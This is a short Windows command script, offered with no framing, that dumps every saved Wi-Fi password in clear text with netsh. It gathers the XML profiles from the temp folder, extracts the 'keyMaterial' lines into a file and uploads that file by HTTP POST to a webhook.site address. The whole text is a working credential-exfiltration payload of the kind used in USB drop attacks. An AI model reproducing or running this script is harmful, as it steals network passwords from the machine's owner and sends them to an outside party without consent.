cd %temp%
netsh wlan export profile key=clear
powershell get-childItem  "'C:\Users\linux\AppData\Local\Temp' -r  *.xml | foreach-Object -Begin {$count = 1}  -Process{ rename-Item $_.fullname -NewName "Note$count.xml";$count++}"
powershell Select-String -Path *.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"
powershell Invoke-WebRequest -Uri https://webhook.site/24b3b193-57ad-4d4c-af8d-7888027de077 -Method POST -InFile Wi-Fi-PASS